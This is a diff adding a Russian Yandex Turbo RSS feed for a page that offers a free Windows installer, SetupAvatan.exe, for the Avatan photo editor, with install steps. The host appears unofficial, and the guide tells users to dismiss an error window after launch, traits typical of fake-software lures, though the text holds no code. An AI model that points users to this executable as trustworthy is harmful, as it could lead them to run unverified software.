@@ -1,0 +1,61 @@
+<rss xmlns:yandex="http://news.yandex.ru" xmlns:media="http://search.yahoo.com/mrss/" xmlns:turbo="http://turbo.yandex.ru" version="2.0">
+  <channel>
+    <title>Скачать Avatan — Фоторедактор. Эффекты и Ретушь.</title>
+    <link>https://avatan-soft.github.io</link>
+    <description>Скачайте бесплатно фоторедактор Аватан на русском языке и редактируйте фотографии с компьютера как прежде.</description>
+    <turbo:analytics type="Yandex" id="90802208"></turbo:analytics>
+    <item turbo="true">
+      <link>https://avatan-soft.github.io</link>
+      <category>Программное обеспечение</category>
+      <pubDate>Thu, 27 Oct 2022 10:39:25 +0300</pubDate>
+      <turbo:content>
+      <![CDATA[
+        <header>
+          <h1>Скачать Avatan — Фоторедактор. Эффекты и Ретушь.</h1>
+          <figure>
+            <img src="https://avatan-soft.github.io/public/css/resources/images/avatan.png">
+          </figure>
+        </header>
+        <p>Скачайте бесплатно фоторедактор Аватан на русском языке и редактируйте фотографии с компьютера как прежде.</p>
+        <button formaction="https://avatan-soft.github.io/files/SetupAvatan.exe" data-background-color="#2ea3e8" data-color="white" data-primary="true">Скачать</button>
+        
+        <h2>Инструкция по установке программы</h2>
+        <p>После того, как вы скачали и запустили Аватан (SetupAvatan.exe), выберите или оставьте по умолчанию путь для установки программы и нажмите "Далее":</p>
+        <figure>
+          <img src="https://avatan-soft.github.io/public/css/resources/images/1.png">
+        </figure>
+
+        <p>Обязательно проверьте чтобы стояла галочка "Создать значок на Рабочем столе" и нажмите "Далее":</p>
+        <figure>
+          <img src="https://avatan-soft.github.io/public/css/resources/images/2.png">
+        </figure>
+
+        <p>Нажмите "Установить":</p>
+        <figure>
+          <img src="https://avatan-soft.github.io/public/css/resources/images/3.png">
+        </figure>
+
+        <p>Дождитесь завершения установки:</p>
+        <figure>
+          <img src="https://avatan-soft.github.io/public/css/resources/images/4.png">
+        </figure>
+
+        <p>Запустите программу:</p>
+        <figure>
+          <img src="https://avatan-soft.github.io/public/css/resources/images/5.png">
+        </figure>
+
+        <p>После загрузки программы может появится такое окошко с ошибкой. Просто закройте его:</p>
+        <figure>
+          <img src="https://avatan-soft.github.io/public/css/resources/images/6.png">
+        </figure>
+
+        <p>Пользуйтесь Аватаном на компьютере :)</p>
+        <figure>
+          <img src="https://avatan-soft.github.io/public/css/resources/images/7.png">
+        </figure>
+      ]]>
+      </turbo:content>
+    </item>
+  </channel>
+</rss>
